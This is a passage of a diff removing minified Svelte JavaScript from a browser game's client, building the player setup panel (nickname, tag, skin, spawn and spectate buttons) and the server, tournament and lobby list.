-                class l extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, s) {
-                            let i;
-                            return (0, x.j0C)(e, o.z, $ => s(0, i = $)), [i]
-                        }, function $(e) {
-                            let t, s, i = e[0] && r();
-                            return {
-                                c() {
-                                    i && i.c(), t = (0, x.Iex)()
-                                },
-                                m($, e) {
-                                    i && i.m($, e), (0, x.Yry)($, t, e), s = !0
-                                },
-                                p($, [e]) {
-                                    $[0] ? i ? 1 & e && (0, x.c7F)(i, 1) : ((i = r()).c(), (0, x.c7F)(i, 1), i.m(t.parentNode, t)) : i && ((0, x.V44)(), (0, x.Tn8)(i, 1, 1, () => {
-                                        i = null
-                                    }), (0, x.GYV)())
-                                },
-                                i($) {
-                                    s || ((0, x.c7F)(i), s = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(i), s = !1
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), i && i.d($)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let c = l
-            },
-            48481($, e, t) {
-                t.d(e, {
-                    A: () => D
-                });
-                var x = t(83839),
-                    s = (t(60821), t(95669)),
-                    i = t(54603),
-                    n = t(7009),
-                    a = t(92854),
-                    o = t(59745),
-                    r = t(97486),
-                    l = t(20990),
-                    c = t(36742),
-                    h = t(33656),
-                    A = t(78225),
-                    u = t(83529),
-                    d = t(95195),
-                    g = t(8125);
-
-                function m($) {
-                    let e, t, s, i, n, a, o, r;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("button"), t = (0, x.ND4)("i"), s = (0, x.xem)(), i = (0, x.Qq7)($[4]), (0, x.CFu)(t, "class", "fas fa-play play-icon s-1l4aaom"), (0, x.CFu)(e, "class", "play button s-1l4aaom"), e.disabled = n = !$[3], (0, x.CFu)(e, "data-tip", a = "Spawn as your " + (0 == $[1] ? "first" : "second") + " tab")
-                        },
-                        m($, n) {
-                            (0, x.Yry)($, e, n), (0, x.BCw)(e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, i), o || (r = (0, x.KTR)(e, "click", w), o = !0)
-                        },
-                        p($, t) {
-                            16 & t && (0, x.iQh)(i, $[4]), 8 & t && n !== (n = !$[3]) && (e.disabled = n), 2 & t && a !== (a = "Spawn as your " + (0 == $[1] ? "first" : "second") + " tab") && (0, x.CFu)(e, "data-tip", a)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), o = !1, r()
-                        }
-                    }
-                }
-
-                function C($) {
-                    let e, t, s, i, n, a;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("button"), t = (0, x.ND4)("i"), (0, x.CFu)(t, "class", "fas fa-search"), (0, x.CFu)(e, "class", "spectate button s-1l4aaom"), e.disabled = s = !$[5], (0, x.CFu)(e, "data-tip", i = "Spectate as your " + (0 == $[1] ? "first" : "second") + " tab")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t), n || (a = (0, x.KTR)(e, "click", v), n = !0)
-                        },
-                        p($, t) {
-                            32 & t && s !== (s = !$[5]) && (e.disabled = s), 2 & t && i !== (i = "Spectate as your " + (0 == $[1] ? "first" : "second") + " tab") && (0, x.CFu)(e, "data-tip", i)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), n = !1, a()
-                        }
-                    }
-                }
-
-                function p($) {
-                    let e, t, s, i, n, a, o, r, l, c, A, d, g, p, f, _, w, v, I, D, N, E, Q, k = $[3],
-                        T, S = $[5],
-                        Y, z, R = m($),
-                        M = C($);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("i"), s = (0, x.xem)(), i = (0, x.ND4)("div"), n = (0, x.ND4)("img"), o = (0, x.xem)(), r = (0, x.ND4)("div"), l = (0, x.xem)(), c = (0, x.ND4)("i"), A = (0, x.xem)(), d = (0, x.ND4)("div"), g = (0, x.ND4)("div"), p = (0, x.ND4)("input"), _ = (0, x.xem)(), w = (0, x.ND4)("input"), I = (0, x.xem)(), D = (0, x.ND4)("input"), E = (0, x.xem)(), Q = (0, x.ND4)("div"), R.c(), T = (0, x.xem)(), M.c(), (0, x.CFu)(t, "class", "selector fas fa-caret-left s-1l4aaom"), (0, x.CFu)(t, "data-tip", "Seek to your previous tab"), (0, x.CFu)(n, "alt", "Skin preview"), (0, x.mq_)(n.src, a = $[2].skins[u.A.dlo("linkTabSkins") ? 0 : $[1]] || h.nG) || (0, x.CFu)(n, "src", a), (0, x.CFu)(n, "class", "skin s-1l4aaom"), (0, x.CFu)(r, "class", "skin background s-1l4aaom"), (0, x.CFu)(i, "class", "preview s-1l4aaom"), (0, x.CFu)(c, "class", "selector fas fa-caret-right s-1l4aaom"), (0, x.CFu)(c, "data-tip", "Seek to your next tab"), (0, x.CFu)(e, "class", "preview-wrapper s-1l4aaom"), (0, x.CFu)(p, "class", "name-input s-1l4aaom"), (0, x.CFu)(p, "type", "text"), (0, x.CFu)(p, "spellcheck", "false"), (0, x.CFu)(p, "placeholder", "Nickname"), (0, x.CFu)(p, "maxlength", "15"), p.value = f = $[2].names[u.A.dlo("linkTabNames") ? 0 : $[1]], (0, x.CFu)(w, "class", "tag-input s-1l4aaom"), (0, x.CFu)(w, "type", "text"), (0, x.CFu)(w, "spellcheck", "false"), (0, x.CFu)(w, "placeholder", "Tag"), (0, x.CFu)(w, "maxlength", "15"), (0, x.CFu)(w, "data-tip", "You only see and chat with players in same tag"), w.value = v = $[2].tags[u.A.dlo("linkTabTags") ? 0 : $[1]], (0, x.CFu)(g, "class", "inputs s-1l4aaom"), (0, x.CFu)(D, "class", "skin-input"), (0, x.CFu)(D, "type", "text"), (0, x.CFu)(D, "spellcheck", "false"), (0, x.CFu)(D, "placeholder", "https://skins.vanis.io/s/"), (0, x.CFu)(D, "maxlength", "31"), D.value = N = $[2].skins[u.A.dlo("linkTabSkins") ? 0 : $[1]], (0, x.CFu)(Q, "class", "buttons s-1l4aaom"), (0, x.CFu)(d, "class", "player-data s-1l4aaom")
-                        },
-                        m(a, h) {
-                            (0, x.Yry)(a, e, h), (0, x.BCw)(e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, i), (0, x.BCw)(i, n), (0, x.BCw)(i, o), (0, x.BCw)(i, r), (0, x.BCw)(e, l), (0, x.BCw)(e, c), (0, x.Yry)(a, A, h), (0, x.Yry)(a, d, h), (0, x.BCw)(d, g), (0, x.BCw)(g, p), (0, x.BCw)(g, _), (0, x.BCw)(g, w), (0, x.BCw)(d, I), (0, x.BCw)(d, D), (0, x.BCw)(d, E), (0, x.BCw)(d, Q), R.m(Q, null), (0, x.BCw)(Q, T), M.m(Q, null), Y || (z = [(0, x.KTR)(t, "click", $[11]), (0, x.KTR)(n, "error", F), (0, x.KTR)(c, "click", $[12]), (0, x.KTR)(p, "change", b), (0, x.KTR)(w, "change", B), (0, x.KTR)(D, "change", y)], Y = !0)
-                        },
-                        p($, e) {
-                            6 & e && !(0, x.mq_)(n.src, a = $[2].skins[u.A.dlo("linkTabSkins") ? 0 : $[1]] || h.nG) && (0, x.CFu)(n, "src", a), 6 & e && f !== (f = $[2].names[u.A.dlo("linkTabNames") ? 0 : $[1]]) && p.value !== f && (p.value = f), 6 & e && v !== (v = $[2].tags[u.A.dlo("linkTabTags") ? 0 : $[1]]) && w.value !== v && (w.value = v), 6 & e && N !== (N = $[2].skins[u.A.dlo("linkTabSkins") ? 0 : $[1]]) && D.value !== N && (D.value = N), 8 & e && (0, x.jXN)(k, k = $[3]) ? (R.d(1), (R = m($)).c(), R.m(Q, T)) : R.p($, e), 32 & e && (0, x.jXN)(S, S = $[5]) ? (M.d(1), (M = C($)).c(), M.m(Q, null)) : M.p($, e)
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(A), (0, x.YoD)(d)), R.d($), M.d($), (Y = !1, x.oOW)(z)
-                        }
-                    }
-                }
-                let f = (0, i.T5)(u.A.inputs),
-                    _ = (f.subscribe(() => u.A.buj()), g.pB.set("Play as tab " + (1 + (0, i.Jt)(g.xR))), u.A.on("zrVIMz", ($, e) => {
-                        "activeTabContext" === $ ? (g.xR.set(e), e = (0, h.Rr)(1 + (0, i.Jt)(g.xR)), (0, i.Jt)(g.pB) != e && g.pB.set(e)) : "linkTabNames" !== $ && "linkTabSkins" !== $ && "linkTabTags" !== $ || f.set((0, i.Jt)(f))
-                    }), () => {
-                        g.xR.set(0 == (0, i.Jt)(g.xR) ? 1 : 0), u.A.set("activeTabContext", (0, i.Jt)(g.xR))
-                    }),
-                    w = () => {
-                        var $;
-                        (0, i.Jt)(g.qC) && !d.A.FLt.Fcz && (d.A.running && d.A.FLt.connected ? (d.A.ycZ(A.A.yNT) || d.A.kmM.Rhi(), d.A.FQe(!1)) : A.A.selectedServer && (d.A.emit("tPqeFj", $ = {}), $.wait || (d.A.FLt.Fcz = !0)))
-                    },
-                    v = () => {
-                        var $;
-                        (0, i.Jt)(g.m7) && !d.A.FLt.zGd && (d.A.running && d.A.FLt.connected ? (d.A.kmM.Xiy(), d.A.FQe(!1)) : A.A.selectedServer && (d.A.emit("tPqeFj", $ = {}), $.wait || (d.A.FLt.zGd = !0)))
-                    },
-                    b = (d.A.on("fzvxek", $ => {
-                        f.update(e => (e.skins[u.A.get("linkTabSkins") ? 0 : (0, i.Jt)(g.xR)] = $, e))
-                    }), $ => {
-                        let e = $.target;
-                        f.update($ => ($.names[u.A.get("linkTabNames") ? 0 : (0, i.Jt)(g.xR)] = e.value, $))
-                    }),
-                    y = $ => {
-                        $ = $.target, d.A.emit("fzvxek", $.value), u.A.buj()
-                    },
-                    B = $ => {
-                        let e = $.target;
-                        f.update($ => ($.tags[u.A.get("linkTabTags") ? 0 : (0, i.Jt)(g.xR)] = e.value, $))
-                    },
-                    F = $ => {
-                        $.currentTarget.src = h.nG
-                    };
-                class I extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, s) {
-                            let i, n, a, o, r, l;
-                            return (0, x.j0C)(e, c.E, $ => s(0, i = $)), (0, x.j0C)(e, g.xR, $ => s(1, n = $)), (0, x.j0C)(e, f, $ => s(2, a = $)), (0, x.j0C)(e, g.qC, $ => s(3, o = $)), (0, x.j0C)(e, g.pB, $ => s(4, r = $)), (0, x.j0C)(e, g.m7, $ => s(5, l = $)), [i, n, a, o, r, l, () => (0, x.vu6)(c.E, i = c.b.Settings, i), () => (0, x.vu6)(c.E, i = c.b.Themes, i), () => (0, x.vu6)(c.E, i = c.b.Inputs, i), () => (0, x.vu6)(c.E, i = c.b.Replays, i), () => (0, x.vu6)(c.E, i = c.b.Leaderboard, i), () => _(), () => _()]
-                        }, function $(e) {
-                            let t, i, c, h, A, u, d, g, m, C, f, _, w, v, b, y, B, F, I, D, N, E, Q, k = e[1],
-                                T, S, Y, z, R, M = (w = new l.A({}), b = new r.A({}), B = new o.A({}), I = new a.A({}), N = new n.A({}), p(e));
-                            return {
-                                c() {
-                                    t = (0, x.ND4)("div"), i = (0, x.ND4)("div"), c = (0, x.ND4)("i"), h = (0, x.xem)(), A = (0, x.ND4)("i"), u = (0, x.xem)(), d = (0, x.ND4)("i"), g = (0, x.xem)(), m = (0, x.ND4)("i"), C = (0, x.xem)(), f = (0, x.ND4)("i"), _ = (0, x.xem)(), (0, x.N0i)(w.$$.fragment), v = (0, x.xem)(), (0, x.N0i)(b.$$.fragment), y = (0, x.xem)(), (0, x.N0i)(B.$$.fragment), F = (0, x.xem)(), (0, x.N0i)(I.$$.fragment), D = (0, x.xem)(), (0, x.N0i)(N.$$.fragment), E = (0, x.xem)(), Q = (0, x.ND4)("div"), M.c(), (0, x.CFu)(c, "data-tip", "Settings"), (0, x.CFu)(c, "class", "tab fal fa-cog"), (0, x.CFu)(A, "data-tip", "Theming"), (0, x.CFu)(A, "class", "tab fal fa-palette"), (0, x.CFu)(d, "data-tip", "Hotkeys"), (0, x.CFu)(d, "class", "tab fal fa-keyboard"), (0, x.CFu)(m, "data-tip", "Replays"), (0, x.CFu)(m, "class", "tab fal fa-video"), (0, x.CFu)(f, "data-tip", "Player leaderboards"), (0, x.CFu)(f, "class", "tab fal fa-clipboard-list"), (0, x.CFu)(i, "class", "tabs"), (0, x.CFu)(Q, "class", "inner-container s-1l4aaom"), (0, x.CFu)(t, "class", "player-container container menu-tab s-1l4aaom")
-                                },
-                                m($, s) {
-                                    (0, x.Yry)($, t, s), (0, x.BCw)(t, i), (0, x.BCw)(i, c), (0, x.BCw)(i, h), (0, x.BCw)(i, A), (0, x.BCw)(i, u), (0, x.BCw)(i, d), (0, x.BCw)(i, g), (0, x.BCw)(i, m), (0, x.BCw)(i, C), (0, x.BCw)(i, f), (0, x.BCw)(t, _), (0, x.wSR)(w, t, null), (0, x.BCw)(t, v), (0, x.wSR)(b, t, null), (0, x.BCw)(t, y), (0, x.wSR)(B, t, null), (0, x.BCw)(t, F), (0, x.wSR)(I, t, null), (0, x.BCw)(t, D), (0, x.wSR)(N, t, null), (0, x.BCw)(t, E), (0, x.BCw)(t, Q), M.m(Q, null), Y = !0, z || (R = [(0, x.KTR)(c, "click", e[6]), (0, x.KTR)(A, "click", e[7]), (0, x.KTR)(d, "click", e[8]), (0, x.KTR)(m, "click", e[9]), (0, x.KTR)(f, "click", e[10])], z = !0)
-                                },
-                                p($, [e]) {
-                                    2 & e && (0, x.jXN)(k, k = $[1]) ? (M.d(1), (M = p($)).c(), M.m(Q, null)) : M.p($, e)
-                                },
-                                i($) {
-                                    Y || ((0, x.c7F)(w.$$.fragment, $), (0, x.c7F)(b.$$.fragment, $), (0, x.c7F)(B.$$.fragment, $), (0, x.c7F)(I.$$.fragment, $), (0, x.c7F)(N.$$.fragment, $), $ && (0, x.Dti)(() => {
-                                        Y && (S && S.end(1), (T = (0, x.b7f)(t, s._J, {
-                                            y: -150,
-                                            duration: 500
-                                        })).start())
-                                    }), Y = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(w.$$.fragment, $), (0, x.Tn8)(b.$$.fragment, $), (0, x.Tn8)(B.$$.fragment, $), (0, x.Tn8)(I.$$.fragment, $), (0, x.Tn8)(N.$$.fragment, $), T && T.invalidate(), $ && (S = (0, x.CUz)(t, s._J, {
-                                        y: -150,
-                                        duration: 500
-                                    })), Y = !1
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), (0, x.Hbl)(w), (0, x.Hbl)(b), (0, x.Hbl)(B), (0, x.Hbl)(I), (0, x.Hbl)(N), M.d($), $ && S && S.end(), (z = !1, x.oOW)(R)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let D = I
-            },
-            43228($, e, t) {
-                t.d(e, {
-                    A: () => F
-                });
-                var x = t(83839),
-                    s = (t(60821), t(95669)),
-                    i = t(61416);
-
-                function n($, e, t) {
-                    return ($ = $.slice())[10] = e[t], $[11] = e, $[12] = t, $
-                }
-
-                function a($, e, t) {
-                    return ($ = $.slice())[13] = e[t], $[15] = t, $
-                }
-
-                function o($, e, t) {
-                    return ($ = $.slice())[13] = e[t], $[15] = t, $
-                }
-
-                function r($, e, t) {
-                    return ($ = $.slice())[17] = e[t], $
-                }
-
-                function l($) {
-                    let e, t, s;
-
-                    function i() {
-                        return $[5]($[17])
-                    }
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("div")).textContent = $[17] + " ", (0, x.CFu)(e, "class", "tab"), (0, x.goL)(e, "active", $[17] === $[0])
-                        },
-                        m($, n) {
-                            (0, x.Yry)($, e, n), t || (s = (0, x.KTR)(e, "click", i), t = !0)
-                        },
-                        p(t, s) {
-                            $ = t, 1 & s && (0, x.goL)(e, "active", $[17] === $[0])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), t = !1, s()
-                        }
-                    }
-                }
-
-                function c($) {
-                    let e, t, s, i = $[1].visible,
-                        n, a, o, r, l = h($),
-                        c = $[1].visible && A($);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), (t = (0, x.ND4)("div")).innerHTML = '<i class="fal fa-trophy"></i> <span style="padding-left:5px;">Tournaments</span>', s = (0, x.xem)(), l.c(), n = (0, x.xem)(), c && c.c(), a = (0, x.Iex)(), (0, x.CFu)(t, "class", "server-name s-1oys449"), (0, x.CFu)(e, "class", "server-item s-1oys449")
-                        },
-                        m(i, h) {
-                            (0, x.Yry)(i, e, h), (0, x.BCw)(e, t), (0, x.BCw)(e, s), l.m(e, null), (0, x.Yry)(i, n, h), c && c.m(i, h), (0, x.Yry)(i, a, h), o || (r = (0, x.KTR)(e, "click", $[6]), o = !0)
-                        },
-                        p($, t) {
-                            2 & t && (0, x.jXN)(i, i = $[1].visible) ? (l.d(1), (l = h($)).c(), l.m(e, null)) : l.p($, t), $[1].visible ? c ? c.p($, t) : ((c = A($)).c(), c.m(a.parentNode, a)) : c && (c.d(1), c = null)
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(n), (0, x.YoD)(a)), l.d($), c && c.d($), o = !1, r()
-                        }
-                    }
-                }
-
-                function h($) {
-                    let e, t;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("i"), (0, x.CFu)(e, "class", t = "fal fa-chevron-" + ($[1].visible ? "up" : "down"))
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        p($, s) {
-                            2 & s && t !== (t = "fal fa-chevron-" + ($[1].visible ? "up" : "down")) && (0, x.CFu)(e, "class", t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function A($) {
-                    let e, t = (0, x.rv_)($[1].wPu),
-                        s = [];
-                    for (let i = 0; i < t.length; i += 1) s[i] = d(o($, t, i));
-                    return {
-                        c() {
-                            for (let $ = 0; $ < s.length; $ += 1) s[$].c();
-                            e = (0, x.Iex)()
-                        },
-                        m($, t) {
-                            for (let i = 0; i < s.length; i += 1) s[i] && s[i].m($, t);
-                            (0, x.Yry)($, e, t)
-                        },
-                        p($, i) {
-                            if (6 & i) {
-                                t = (0, x.rv_)($[1].wPu);
-                                let n;
-                                for (n = 0; n < t.length; n += 1) {
-                                    var a = o($, t, n);
-                                    s[n] ? s[n].p(a, i) : (s[n] = d(a), s[n].c(), s[n].m(e.parentNode, e))
-                                }
-                                for (; n < s.length; n += 1) s[n].d(1);
-                                s.length = t.length
-                            }
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), (0, x.ppq)(s, $)
-                        }
-                    }
-                }
-
-                function u() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("div")).innerHTML = '<span class="live-marker">LIVE</span>', (0, x.CFu)($, "class", "live-marker-wrapper")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function d($) {
-                    let e, t, s, i, n, a, o, r = $[13].live && u();
-
-                    function l() {
-                        return $[7]($[13])
-                    }
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), (t = (0, x.ND4)("div")).textContent = "" + $[13].name, s = (0, x.xem)(), r && r.c(), i = (0, x.xem)(), (0, x.CFu)(t, "class", "server-name s-1oys449"), (0, x.CFu)(e, "data-key", n = $[15]), (0, x.CFu)(e, "class", "server-item s-1oys449"), (0, x.goL)(e, "active", $[13].url === $[2])
-                        },
-                        m($, n) {
-                            (0, x.Yry)($, e, n), (0, x.BCw)(e, t), (0, x.BCw)(e, s), r && r.m(e, null), (0, x.BCw)(e, i), a || (o = (0, x.KTR)(e, "click", l), a = !0)
-                        },
-                        p(t, s) {
-                            ($ = t)[13].live ? r || ((r = u()).c(), r.m(e, i)) : r && (r.d(1), r = null), 6 & s && (0, x.goL)(e, "active", $[13].url === $[2])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), r && r.d(), a = !1, o()
-                        }
-                    }
-                }
-
-                function g($) {
-                    let e, t, s, i = $[10].visible,
-                        n, a = $[10].visible || $[10].wPu.some($[4]),
-                        o, r, l, c = m($);
-
-                    function h() {
-                        return $[8]($[10], $[11], $[12])
-                    }
-                    let A = a && C($);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), (t = (0, x.ND4)("div")).textContent = "" + $[10].name, s = (0, x.xem)(), c.c(), n = (0, x.xem)(), A && A.c(), o = (0, x.Iex)(), (0, x.CFu)(t, "class", "server-name s-1oys449"), (0, x.CFu)(e, "class", "server-item s-1oys449")
-                        },
-                        m($, i) {
-                            (0, x.Yry)($, e, i), (0, x.BCw)(e, t), (0, x.BCw)(e, s), c.m(e, null), (0, x.Yry)($, n, i), A && A.m($, i), (0, x.Yry)($, o, i), r || (l = (0, x.KTR)(e, "click", h), r = !0)
-                        },
-                        p(t, s) {
-                            $ = t, 8 & s && (0, x.jXN)(i, i = $[10].visible) ? (c.d(1), (c = m($)).c(), c.m(e, null)) : c.p($, s), (a = 12 & s ? $[10].visible || $[10].wPu.some($[4]) : a) ? A ? A.p($, s) : ((A = C($)).c(), A.m(o.parentNode, o)) : A && (A.d(1), A = null)
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(n), (0, x.YoD)(o)), c.d($), A && A.d($), r = !1, l()
-                        }
-                    }
-                }
-
-                function m($) {
-                    let e, t;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("i"), (0, x.CFu)(e, "class", t = "fal fa-chevron-" + ($[10].visible ? "up" : "down"))
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        p($, s) {
-                            8 & s && t !== (t = "fal fa-chevron-" + ($[10].visible ? "up" : "down")) && (0, x.CFu)(e, "class", t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function C($) {
-                    let e, t = (0, x.rv_)($[10].wPu),
-                        s = [];
-                    for (let i = 0; i < t.length; i += 1) s[i] = _(a($, t, i));
-                    return {
-                        c() {
-                            for (let $ = 0; $ < s.length; $ += 1) s[$].c();
-                            e = (0, x.Iex)()
-                        },
-                        m($, t) {
-                            for (let i = 0; i < s.length; i += 1) s[i] && s[i].m($, t);
-                            (0, x.Yry)($, e, t)
-                        },
-                        p($, i) {
-                            if (12 & i) {
-                                t = (0, x.rv_)($[10].wPu);
-                                let n;
-                                for (n = 0; n < t.length; n += 1) {
-                                    var o = a($, t, n);
-                                    s[n] ? s[n].p(o, i) : (s[n] = _(o), s[n].c(), s[n].m(e.parentNode, e))
-                                }
-                                for (; n < s.length; n += 1) s[n].d(1);
-                                s.length = t.length
-                            }
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), (0, x.ppq)(s, $)
-                        }
-                    }
-                }
-
-                function p($) {
-                    let e;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("div")).textContent = $[13].players + " / " + $[13].slots, (0, x.CFu)(e, "class", "slot-badge s-1oys449")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function f($) {
-                    let e;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("div")).innerHTML = '<span class="live-marker">LIVE</span>', (0, x.CFu)(e, "class", "live-marker-wrapper")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function _($) {
-                    let e, t, s, i, n, a, o;
-
-                    function r($) {
-                        return $[13].live ? f : p
-                    }
-                    let l = r($),
-                        c = l($);
-
-                    function h() {
-                        return $[9]($[13])
-                    }
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), (t = (0, x.ND4)("div")).textContent = "" + $[13].name, s = (0, x.xem)(), c.c(), i = (0, x.xem)(), (0, x.CFu)(t, "class", "server-name s-1oys449"), (0, x.CFu)(e, "data-key", n = $[15]), (0, x.CFu)(e, "class", "server-item s-1oys449"), (0, x.goL)(e, "active", $[13].url === $[2])
-                        },
-                        m($, n) {
-                            (0, x.Yry)($, e, n), (0, x.BCw)(e, t), (0, x.BCw)(e, s), c.m(e, null), (0, x.BCw)(e, i), a || (o = (0, x.KTR)(e, "click", h), a = !0)
-                        },
-                        p(t, s) {
-                            l === (l = r($ = t)) && c ? c.p($, s) : (c.d(1), (c = l($)) && (c.c(), c.m(e, i))), 12 & s && (0, x.goL)(e, "active", $[13].url === $[2])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), c.d(), a = !1, o()
-                        }
-                    }
-                }
-
-                function w($) {
-                    let e, t = 0 < $[10].wPu.length && g($);
-                    return {
-                        c() {
-                            t && t.c(), e = (0, x.Iex)()
-                        },
-                        m($, s) {
-                            t && t.m($, s), (0, x.Yry)($, e, s)
-                        },
-                        p($, x) {
-                            0 < $[10].wPu.length ? t ? t.p($, x) : ((t = g($)).c(), t.m(e.parentNode, e)) : t && (t.d(1), t = null)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), t && t.d($)
-                        }
-                    }
-                }
-
-                function v($) {
-                    let e, t = (0, x.rv_)($[3]),
-                        s = [];
-                    for (let i = 0; i < t.length; i += 1) s[i] = w(n($, t, i));
-                    return {
-                        c() {
-                            for (let $ = 0; $ < s.length; $ += 1) s[$].c();
-                            e = (0, x.Iex)()
-                        },
-                        m($, t) {
-                            for (let i = 0; i < s.length; i += 1) s[i] && s[i].m($, t);
-                            (0, x.Yry)($, e, t)
-                        },
-                        p($, i) {
-                            if (12 & i) {
-                                t = (0, x.rv_)($[3]);
-                                let a;
-                                for (a = 0; a < t.length; a += 1) {
-                                    var o = n($, t, a);
-                                    s[a] ? s[a].p(o, i) : (s[a] = w(o), s[a].c(), s[a].m(e.parentNode, e))
-                                }
-                                for (; a < s.length; a += 1) s[a].d(1);
-                                s.length = t.length
-                            }
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), (0, x.ppq)(s, $)
-                        }
-                    }
-                }
-
-                function b($) {
-                    let e, t, s, i, n, a, o, r = $[2],
-                        l, h, A = null != $[1] && 0 < $[1].wPu.length && c($),
-                        u = v($);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("div"), (s = (0, x.ND4)("div")).innerHTML = '<i class="fal fa-user"></i> <span style="padding-left:5px;">Lobbies</span>', i = (0, x.xem)(), n = (0, x.ND4)("i"), a = (0, x.xem)(), A && A.c(), o = (0, x.xem)(), u.c(), (0, x.CFu)(s, "class", "server-name s-1oys449"), (0, x.CFu)(n, "class", "fal fa-chevron-down"), (0, x.CFu)(t, "class", "server-item s-1oys449"), (0, x.CFu)(e, "class", "server-list s-1oys449")
-                        },
-                        m($, r) {
-                            (0, x.Yry)($, e, r), (0, x.BCw)(e, t), (0, x.BCw)(t, s), (0, x.BCw)(t, i), (0, x.BCw)(t, n), (0, x.BCw)(e, a), A && A.m(e, null), (0, x.BCw)(e, o), u.m(e, null), l || (h = (0, x.KTR)(t, "click", y), l = !0)
-                        },
-                        p($, t) {
-                            null != $[1] && 0 < $[1].wPu.length ? A ? A.p($, t) : ((A = c($)).c(), A.m(e, o)) : A && (A.d(1), A = null), 4 & t && (0, x.jXN)(r, r = $[2]) ? (u.d(1), (u = v($)).c(), u.m(e, null)) : u.p($, t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), A && A.d(), u.d($), l = !1, h()
-                        }
-                    }
-                }
-                let y = () => {};
-                class B extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, s) {
-                            let n, a, o, r;
-                            return (0, x.j0C)(e, i.aK, $ => s(0, n = $)), (0, x.j0C)(e, i.AQ, $ => s(1, a = $)), (0, x.j0C)(e, i.BA, $ => s(2, o = $)), (0, x.j0C)(e, i.oo, $ => s(3, r = $)), [n, a, o, r, $ => $.url == o, $ => i.pc.LEA($), () => i.AQ.update($ => ($.wGF(), $)), $ => i.pc.join($), ($, e, t) => (0, x.vu6)(i.oo, e[t] = $, r).wGF(), $ => i.pc.join($)]
-                        }, function $(e) {
-                            let t, n, a, o = e[0],
-                                c, h, A, u = (0, x.rv_)(i.pc.regions),
-                                d = [];
-                            for (let g = 0; g < u.length; g += 1) d[g] = l(r(e, u, g));
-                            let m = b(e);
-                            return {
-                                c() {
-                                    t = (0, x.ND4)("div"), n = (0, x.ND4)("div");
-                                    for (let $ = 0; $ < d.length; $ += 1) d[$].c();
-                                    a = (0, x.xem)(), m.c(), (0, x.CFu)(n, "class", "tabs"), (0, x.CFu)(t, "class", "servers container menu-tab s-1oys449")
-                                },
-                                m($, e) {
-                                    (0, x.Yry)($, t, e), (0, x.BCw)(t, n);
-                                    for (let s = 0; s < d.length; s += 1) d[s] && d[s].m(n, null);
-                                    (0, x.BCw)(t, a), m.m(t, null), A = !0
-                                },
-                                p($, [e]) {
-                                    if (1 & e) {
-                                        u = (0, x.rv_)(i.pc.regions);
-                                        let s;
-                                        for (s = 0; s < u.length; s += 1) {
-                                            var a = r($, u, s);
-                                            d[s] ? d[s].p(a, e) : (d[s] = l(a), d[s].c(), d[s].m(n, null))
-                                        }
-                                        for (; s < d.length; s += 1) d[s].d(1);
-                                        d.length = u.length
-                                    }
-                                    1 & e && (0, x.jXN)(o, o = $[0]) ? (m.d(1), (m = b($)).c(), m.m(t, null)) : m.p($, e)
-                                },
-                                i($) {
-                                    A || ($ && (0, x.Dti)(() => {
-                                        A && (h && h.end(1), (c = (0, x.b7f)(t, s._J, {
-                                            x: -150,
-                                            duration: 500
-                                        })).start())
-                                    }), A = !0)
-                                },
-                                o($) {
-                                    c && c.invalidate(), $ && (h = (0, x.CUz)(t, s._J, {
-                                        x: -150,
-                                        duration: 500
-                                    })), A = !1
-                                },
-                                d($) {
